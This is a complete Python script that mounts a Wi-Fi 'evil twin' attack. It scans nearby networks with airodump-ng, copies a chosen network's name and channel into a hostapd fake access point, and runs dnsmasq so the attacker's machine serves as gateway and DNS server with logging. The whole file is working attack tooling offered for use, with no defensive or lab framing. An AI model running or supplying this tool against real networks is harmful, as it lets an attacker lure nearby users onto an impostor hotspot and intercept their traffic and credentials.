#!/usr/bin/env python3

import os
import subprocess
import time
import csv
import glob
import sys
import signal
import shutil


# Physical interface name (usually wlan0)
PHY_INTERFACE = "wlan0" 
FAKE_IP = "10.0.0.1"
DHCP_RANGE = "10.0.0.10,10.0.0.50,12h"
SCAN_PREFIX = "target_scan"

class FakeAP:
    def __init__(self):
        self.target_ssid = None
        self.target_channel = None
        self.mon_interface = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None

    def check_root(self):
        if os.geteuid() != 0:
            print("[!] Must run as root (sudo).")
            sys.exit(1)

    def check_tools(self):
        required = ["hostapd", "dnsmasq", "airmon-ng", "airodump-ng"]
        missing = [t for t in required if not shutil.which(t)]
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            print("Install them: sudo apt install hostapd dnsmasq aircrack-ng")
            sys.exit(1)

#First we scan for available networks to check which network to copy
    def start_monitor_mode(self):
        print("[*] Enabling Monitor Mode for scanning...")
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Start airmon-ng
        subprocess.run(["airmon-ng", "start", PHY_INTERFACE], capture_output=True, text=True)
        
        # Detect the new monitor interface name (usually wlan0mon)
        self.mon_interface = PHY_INTERFACE + "mon"
        
        # Verify it exists, otherwise assume it stayed as wlan0
        if not os.path.exists(f"/sys/class/net/{self.mon_interface}"):
            self.mon_interface = PHY_INTERFACE

        print(f"[+] Monitor interface active: {self.mon_interface}")

    def scan_for_targets(self):
        # Cleanup old scans
        for f in glob.glob(f"{SCAN_PREFIX}*"):
            try: os.remove(f)
            except: pass

        print("[*] Scanning for 10 seconds...")
        cmd = [
            "airodump-ng", self.mon_interface,
            "--write", SCAN_PREFIX,
            "--output-format", "csv"
        ]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            proc.terminate()
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()

    def select_target(self):
        files = glob.glob(f"{SCAN_PREFIX}-*.csv")
        if not files:
            print("[-] No scan data found.")
            return False
            
        latest_csv = max(files, key=os.path.getmtime)
        networks = []

        with open(latest_csv, newline='', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() in ["BSSID", "Station MAC", ""]: continue
                
                ssid = row[13].strip()
                if not ssid: continue

                networks.append({
                    "bssid": row[0].strip(),
                    "channel": row[3].strip(),
                    "enc": row[5].strip(),
                    "essid": ssid
                })

        if not networks:
            print("[-] No networks found.")
            return False

        print("\nID  CH   SSID")
        print("--  ---  --------------------")
        for i, net in enumerate(networks):
            print(f"{i:<3} {net['channel']:<4} {net['essid']}")

        while True:
            try:
                sel = input("\n[?] Select target ID: ")
                idx = int(sel)
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    self.target_ssid = target['essid']
                    self.target_channel = target['channel']
                    return True
            except ValueError:
                pass
            print("Invalid selection.")

#Switch from Monitor mode to managed mode to allow for hosting of fake AP
    def stop_monitor_mode(self):
        """Stops monitor mode to free the card for Hostapd."""
        print("\n[*] Stopping Monitor Mode...")
        subprocess.run(["airmon-ng", "stop", self.mon_interface], stdout=subprocess.DEVNULL)
        
        # Restart network manager sometimes interferes, so we kill it again just in case
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Ensure phy interface is back
        time.sleep(2)
        print(f"[+] Reverted to managed mode on {PHY_INTERFACE}")

# Hosting the Fake AP , so devices can connect, 
    def create_configs(self):
        print("[*] Generating hostapd config...")
        
        hostapd_conf = f"""
interface={PHY_INTERFACE}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.target_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open("hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""
interface={PHY_INTERFACE}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{FAKE_IP}
dhcp-option=6,{FAKE_IP}
server=8.8.8.8
log-queries
log-dhcp
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

    def setup_networking(self):
        # Set IP for the interface
        print(f"[*] Setting gateway IP {FAKE_IP}...")
        subprocess.run(["ifconfig", PHY_INTERFACE, FAKE_IP, "netmask", "255.255.255.0", "up"])
        # Enable forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def start_services(self):
        print("[+] Starting DNSMASQ...")
        self.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", "dnsmasq.conf", "-d"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE
        )

        print("[+] Starting HOSTAPD (Fake AP)...")
        print(f"\n[!] EVIL TWIN LIVE: '{self.target_ssid}' on Channel {self.target_channel}")
        print("[!] Logs (Connections will appear below):\n")
        
        # Piping stdout to console so user sees connections
        self.hostapd_proc = subprocess.Popen(
            ["hostapd", "hostapd.conf"],
            stdout=sys.stdout,
            stderr=sys.stderr
        )

        try:
            self.hostapd_proc.wait()
        except KeyboardInterrupt:
            pass

    def cleanup(self):
        print("\n[*] Shutting down...")
        if self.hostapd_proc: self.hostapd_proc.terminate()
        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
        
        # Remove configs
        if os.path.exists("hostapd.conf"): os.remove("hostapd.conf")
        if os.path.exists("dnsmasq.conf"): os.remove("dnsmasq.conf")
        
        # Reset IP
        subprocess.run(["ifconfig", PHY_INTERFACE, "0.0.0.0"])
        print("[+] Done.")

    def run(self):
        self.check_root()
        self.check_tools()
        
        try:
            # Scan Phase
            self.start_monitor_mode()
            self.scan_for_targets()
            if not self.select_target():
                self.stop_monitor_mode()
                return

            # Transition
            self.stop_monitor_mode()

            # Attack Phase
            self.create_configs()
            self.setup_networking()
            self.start_services()
        
        except Exception as e:
            print(f"\n[!] Unexpected Error: {e}")
        finally:
            self.cleanup()

if __name__ == "__main__":
    FakeAP().run()
